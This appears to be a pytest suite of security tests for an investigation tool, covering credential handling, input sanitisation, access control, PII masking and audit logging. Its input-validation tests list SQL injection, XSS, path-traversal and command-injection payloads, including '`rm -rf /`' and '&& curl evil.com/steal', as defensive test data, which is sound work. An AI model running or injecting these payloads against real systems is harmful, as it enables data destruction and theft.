"""Comprehensive security validation tests for Sleuth Intel."""

import asyncio
import base64
import hashlib
import json
import os
import re
from datetime import datetime, timedelta
from typing import Any, Dict, List
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
import pytest_asyncio

from src.orchestrator import InvestigationOrchestrator
from src.models import Query
from src.utils.encryption import EncryptionManager
from src.utils.auth import AuthenticationManager


class TestCredentialSecurity:
    """Test credential management and security."""

    @pytest.mark.asyncio
    async def test_api_keys_not_in_logs(self, orchestrator, capture_logs):
        """Ensure API keys are not logged."""
        logs, log_capture = capture_logs
        
        # Set a test API key
        test_api_key = "sk-test-1234567890abcdef"
        os.environ['ENFORMION_API_KEY'] = test_api_key
        
        # Perform operation that might log
        query = Query(
            query_type="person_search",
            parameters={"first_name": "Test", "last_name": "User"},
            metadata={"test": "credential_logging"}
        )
        
        with patch('src.orchestrator.logger.info', log_capture):
            await orchestrator.investigate(query)
        
        # Check logs don't contain API key
        for log in logs:
            assert test_api_key not in str(log)
            assert "sk-test" not in str(log)

    @pytest.mark.asyncio
    async def test_credentials_encrypted_at_rest(self, temp_directory):
        """Test credentials are encrypted when stored."""
        encryption_manager = EncryptionManager()
        
        credentials = {
            "api_key": "sensitive-api-key-123",
            "secret": "super-secret-value",
            "password": "P@ssw0rd123!"
        }
        
        # Encrypt and save
        encrypted_data = encryption_manager.encrypt(json.dumps(credentials))
        cred_file = temp_directory / "credentials.enc"
        cred_file.write_bytes(encrypted_data)
        
        # Read raw file
        raw_content = cred_file.read_bytes()
        raw_text = raw_content.decode('utf-8', errors='ignore')
        
        # Ensure plaintext credentials are not in file
        assert "sensitive-api-key-123" not in raw_text
        assert "super-secret-value" not in raw_text
        assert "P@ssw0rd123!" not in raw_text

    @pytest.mark.asyncio
    async def test_credential_rotation(self, orchestrator):
        """Test credential rotation capability."""
        old_key = "old-api-key-123"
        new_key = "new-api-key-456"
        
        # Set initial key
        orchestrator.config.api_key = old_key
        
        # Rotate credential
        await orchestrator.rotate_credentials({
            "api_key": new_key
        })
        
        # Verify rotation
        assert orchestrator.config.api_key == new_key
        assert orchestrator.config.api_key != old_key

    @pytest.mark.asyncio
    async def test_secure_credential_transmission(self, orchestrator):
        """Test credentials are transmitted securely."""
        with patch('aiohttp.ClientSession.request') as mock_request:
            mock_response = AsyncMock()
            mock_response.status = 200
            mock_response.json = AsyncMock(return_value={})
            mock_request.return_value.__aenter__.return_value = mock_response
            
            # Make API call
            await orchestrator.api_client.search_person(
                first_name="Test",
                last_name="User"
            )
            
            # Verify HTTPS and proper headers
            call_args = mock_request.call_args
            assert call_args[0][0] == 'POST'
            assert call_args[0][1].startswith('https://')
            
            headers = call_args[1].get('headers', {})
            assert 'Authorization' in headers or 'X-API-Key' in headers


class TestInputValidation:
    """Test input validation and sanitization."""

    @pytest.mark.asyncio
    async def test_sql_injection_prevention(self, orchestrator):
        """Test SQL injection attack prevention."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM passwords--",
            "1; DELETE FROM users WHERE 1=1--"
        ]
        
        for malicious_input in malicious_inputs:
            query = Query(
                query_type="person_search",
                parameters={
                    "first_name": malicious_input,
                    "last_name": "Test"
                },
                metadata={"security_test": "sql_injection"}
            )
            
            # Should either sanitize or reject
            try:
                result = await orchestrator.investigate(query)
                # If accepted, ensure input was sanitized
                assert malicious_input not in str(result.raw_data)
            except (ValueError, ValidationError) as e:
                # Rejecting malicious input is correct
                assert "invalid" in str(e).lower() or "malicious" in str(e).lower()

    @pytest.mark.asyncio
    async def test_xss_prevention(self, orchestrator):
        """Test XSS attack prevention."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        for payload in xss_payloads:
            query = Query(
                query_type="person_search",
                parameters={
                    "first_name": payload,
                    "last_name": "Test",
                    "notes": payload
                },
                metadata={"security_test": "xss"}
            )
            
            result = await orchestrator.investigate(query)
            
            # Check output is sanitized
            result_str = str(result.findings)
            assert "<script>" not in result_str
            assert "javascript:" not in result_str
            assert "onerror=" not in result_str
            assert "onload=" not in result_str

    @pytest.mark.asyncio
    async def test_command_injection_prevention(self, orchestrator):
        """Test command injection prevention."""
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "`rm -rf /`",
            "$(whoami)",
            "&& curl evil.com/steal"
        ]
        
        for payload in command_payloads:
            query = Query(
                query_type="person_search",
                parameters={
                    "first_name": payload,
                    "last_name": "Test"
                },
                metadata={"security_test": "command_injection"}
            )
            
            # Should not execute commands
            result = await orchestrator.investigate(query)
            
            # Verify no command execution occurred
            assert os.path.exists("/etc/passwd")  # System still intact

    @pytest.mark.asyncio
    async def test_path_traversal_prevention(self, orchestrator):
        """Test path traversal attack prevention."""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for payload in traversal_payloads:
            query = Query(
                query_type="file_lookup",
                parameters={
                    "filename": payload
                },
                metadata={"security_test": "path_traversal"}
            )
            
            with pytest.raises((ValueError, PermissionError, FileNotFoundError)):
                await orchestrator.investigate(query)

    @pytest.mark.asyncio
    async def test_input_length_limits(self, orchestrator):
        """Test input length validation."""
        # Create oversized inputs
        oversized_inputs = {
            "first_name": "A" * 10000,
            "last_name": "B" * 10000,
            "notes": "C" * 1000000
        }
        
        query = Query(
            query_type="person_search",
            parameters=oversized_inputs,
            metadata={"security_test": "input_length"}
        )
        
        # Should reject or truncate
        with pytest.raises(ValueError) as exc_info:
            await orchestrator.investigate(query)
        
        assert "too long" in str(exc_info.value).lower() or "exceeds" in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_special_character_handling(self, orchestrator):
        """Test special character sanitization."""
        special_chars = [
            "O'Brien",  # Valid apostrophe
            "María José",  # Valid accented characters
            "user@example.com",  # Valid email
            "Test\x00User",  # Null byte
            "Test\r\nUser",  # CRLF injection
            "Test%00User"  # URL encoded null
        ]
        
        for name in special_chars:
            query = Query(
                query_type="person_search",
                parameters={
                    "first_name": name,
                    "last_name": "Test"
                },
                metadata={"security_test": "special_chars"}
            )
            
            result = await orchestrator.investigate(query)
            
            # Null bytes should be removed
            assert "\x00" not in str(result.findings)
            assert "%00" not in str(result.findings)


class TestAccessControl:
    """Test access control and authorization."""

    @pytest.mark.asyncio
    async def test_authentication_required(self, orchestrator):
        """Test authentication is required for sensitive operations."""
        # Remove authentication
        orchestrator.auth_token = None
        
        sensitive_query = Query(
            query_type="admin_operation",
            parameters={"action": "export_all_data"},
            metadata={"requires_auth": True}
        )
        
        with pytest.raises(PermissionError) as exc_info:
            await orchestrator.investigate(sensitive_query)
        
        assert "authentication" in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_role_based_access(self, orchestrator):
        """Test role-based access control."""
        # Test different user roles
        roles = {
            "viewer": ["read"],
            "analyst": ["read", "search", "analyze"],
            "admin": ["read", "write", "delete", "admin"]
        }
        
        for role, permissions in roles.items():
            orchestrator.user_role = role
            
            # Test allowed operations
            if "read" in permissions:
                query = Query(
                    query_type="person_search",
                    parameters={"first_name": "Test", "last_name": "User"},
                    metadata={"role_test": role}
                )
                result = await orchestrator.investigate(query)
                assert result is not None
            
            # Test restricted operations
            if "admin" not in permissions:
                admin_query = Query(
                    query_type="delete_all",
                    parameters={},
                    metadata={"role_test": role}
                )
                with pytest.raises(PermissionError):
                    await orchestrator.investigate(admin_query)

    @pytest.mark.asyncio
    async def test_session_management(self, orchestrator):
        """Test secure session management."""
        auth_manager = AuthenticationManager()
        
        # Create session
        session_token = await auth_manager.create_session(
            user_id="test_user",
            expiry=timedelta(hours=1)
        )
        
        # Validate session
        assert await auth_manager.validate_session(session_token)
        
        # Test session expiry
        expired_token = await auth_manager.create_session(
            user_id="test_user",
            expiry=timedelta(seconds=-1)
        )
        assert not await auth_manager.validate_session(expired_token)
        
        # Test session invalidation
        await auth_manager.invalidate_session(session_token)
        assert not await auth_manager.validate_session(session_token)

    @pytest.mark.asyncio
    async def test_api_key_validation(self, orchestrator):
        """Test API key validation."""
        valid_key = "valid-api-key-123"
        invalid_key = "invalid-api-key-456"
        
        # Test with valid key
        orchestrator.api_key = valid_key
        query = Query(
            query_type="person_search",
            parameters={"first_name": "Test", "last_name": "User"},
            metadata={"api_key_test": True}
        )
        
        with patch.object(orchestrator, 'validate_api_key', return_value=True):
            result = await orchestrator.investigate(query)
            assert result is not None
        
        # Test with invalid key
        orchestrator.api_key = invalid_key
        with patch.object(orchestrator, 'validate_api_key', return_value=False):
            with pytest.raises(PermissionError):
                await orchestrator.investigate(query)


class TestDataProtection:
    """Test data protection and privacy."""

    @pytest.mark.asyncio
    async def test_pii_masking(self, orchestrator):
        """Test PII is masked in logs and outputs."""
        sensitive_data = {
            "ssn": "123-45-6789",
            "credit_card": "4111-1111-1111-1111",
            "email": "user@example.com",
            "phone": "555-123-4567",
            "dob": "1990-01-01"
        }
        
        query = Query(
            query_type="person_search",
            parameters=sensitive_data,
            metadata={"pii_test": True}
        )
        
        # Capture logs
        with patch('src.orchestrator.logger') as mock_logger:
            await orchestrator.investigate(query)
            
            # Check logs for PII masking
            for call in mock_logger.info.call_args_list:
                log_message = str(call)
                assert "123-45-6789" not in log_message
                assert "4111-1111-1111-1111" not in log_message
                # Email and phone might be partially shown
                assert not re.search(r'\d{3}-\d{2}-\d{4}', log_message)  # No SSN
                assert not re.search(r'\d{4}-\d{4}-\d{4}-\d{4}', log_message)  # No CC

    @pytest.mark.asyncio
    async def test_data_encryption_at_rest(self, orchestrator, temp_directory):
        """Test sensitive data is encrypted at rest."""
        sensitive_report = {
            "subject": "John Doe",
            "ssn": "123-45-6789",
            "findings": {
                "criminal_record": "None",
                "financial_status": "Good"
            }
        }
        
        # Save report
        report_file = temp_directory / "report.json"
        await orchestrator.save_report(sensitive_report, report_file, encrypt=True)
        
        # Read raw file
        raw_content = report_file.read_text()
        
        # Sensitive data should not be in plaintext
        assert "123-45-6789" not in raw_content
        assert "John Doe" not in raw_content
        assert "criminal_record" not in raw_content

    @pytest.mark.asyncio
    async def test_secure_data_deletion(self, orchestrator, temp_directory):
        """Test secure deletion of sensitive data."""
        # Create sensitive file
        sensitive_file = temp_directory / "sensitive.dat"
        sensitive_content = b"SSN: 123-45-6789\nPassword: secret123"
        sensitive_file.write_bytes(sensitive_content)
        
        # Secure delete
        await orchestrator.secure_delete(sensitive_file)
        
        # File should be gone
        assert not sensitive_file.exists()
        
        # Try to recover (simplified test)
        # In real implementation, would check if data is overwritten
        assert not any(
            f.name == "sensitive.dat" 
            for f in temp_directory.iterdir()
        )

    @pytest.mark.asyncio
    async def test_gdpr_compliance(self, orchestrator):
        """Test GDPR compliance features."""
        user_id = "gdpr_test_user"
        
        # Store user data
        user_data = {
            "id": user_id,
            "name": "Test User",
            "email": "test@example.com",
            "preferences": {"marketing": False}
        }
        
        await orchestrator.store_user_data(user_data)
        
        # Test right to access
        retrieved_data = await orchestrator.export_user_data(user_id)
        assert retrieved_data["id"] == user_id
        assert retrieved_data["name"] == user_data["name"]
        
        # Test right to deletion
        await orchestrator.delete_user_data(user_id)
        
        # Verify deletion
        with pytest.raises(KeyError):
            await orchestrator.get_user_data(user_id)

    @pytest.mark.asyncio
    async def test_data_retention_policies(self, orchestrator):
        """Test data retention and auto-deletion."""
        # Create data with retention policy
        query = Query(
            query_type="person_search",
            parameters={"first_name": "Retention", "last_name": "Test"},
            metadata={
                "retention_days": 1,
                "created_at": (datetime.now() - timedelta(days=2)).isoformat()
            }
        )
        
        # Process retention
        await orchestrator.process_data_retention()
        
        # Old data should be deleted
        old_data = await orchestrator.get_query_result(query.metadata.get("request_id"))
        assert old_data is None


class TestAuditingAndLogging:
    """Test audit trail and logging security."""

    @pytest.mark.asyncio
    async def test_audit_trail_creation(self, orchestrator, temp_directory):
        """Test comprehensive audit trail."""
        audit_file = temp_directory / "audit.log"
        
        # Configure audit logging
        orchestrator.configure_audit_logging(audit_file)
        
        # Perform operations
        operations = [
            ("search", {"first_name": "Audit", "last_name": "Test"}),
            ("update", {"id": "123", "status": "verified"}),
            ("delete", {"id": "456"})
        ]
        
        for op_type, params in operations:
            query = Query(
                query_type=op_type,
                parameters=params,
                metadata={
                    "user": "test_user",
                    "ip": "192.168.1.100",
                    "timestamp": datetime.now().isoformat()
                }
            )
            await orchestrator.investigate(query)
        
        # Verify audit log
        if audit_file.exists():
            audit_content = audit_file.read_text()
            assert "search" in audit_content
            assert "update" in audit_content
            assert "delete" in audit_content
            assert "test_user" in audit_content
            assert "192.168.1.100" in audit_content

    @pytest.mark.asyncio
    async def test_tamper_proof_logging(self, orchestrator, temp_directory):
        """Test logs cannot be tampered with."""
        log_file = temp_directory / "secure.log"
        
        # Write signed log entry
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "action": "sensitive_operation",
            "user": "admin",
            "result": "success"
        }
        
        # Sign log entry
        signature = hashlib.sha256(
            json.dumps(log_entry, sort_keys=True).encode()
        ).hexdigest()
        
        log_entry["signature"] = signature
        
        # Write to file
        with open(log_file, 'a') as f:
            f.write(json.dumps(log_entry) + "\n")
        
        # Verify integrity
        with open(log_file, 'r') as f:
            stored_entry = json.loads(f.readline())
        
        stored_signature = stored_entry.pop("signature")
        calculated_signature = hashlib.sha256(
            json.dumps(stored_entry, sort_keys=True).encode()
        ).hexdigest()
        
        assert stored_signature == calculated_signature

    @pytest.mark.asyncio
    async def test_security_event_alerting(self, orchestrator):
        """Test security event detection and alerting."""
        security_events = []
        
        async def security_handler(event):
            security_events.append(event)
        
        orchestrator.register_security_handler(security_handler)
        
        # Trigger security events
        # Multiple failed auth attempts
        for i in range(5):
            try:
                await orchestrator.authenticate("wrong_user", "wrong_pass")
            except:
                pass
        
        # Suspicious query pattern
        malicious_query = Query(
            query_type="person_search",
            parameters={
                "first_name": "'; DROP TABLE users; --",
                "last_name": "Test"
            },
            metadata={"security_test": True}
        )
        
        try:
            await orchestrator.investigate(malicious_query)
        except:
            pass
        
        # Check security events were triggered
        assert len(security_events) > 0
        assert any("authentication" in str(e).lower() for e in security_events)
        assert any("suspicious" in str(e).lower() or "malicious" in str(e).lower() for e in security_events)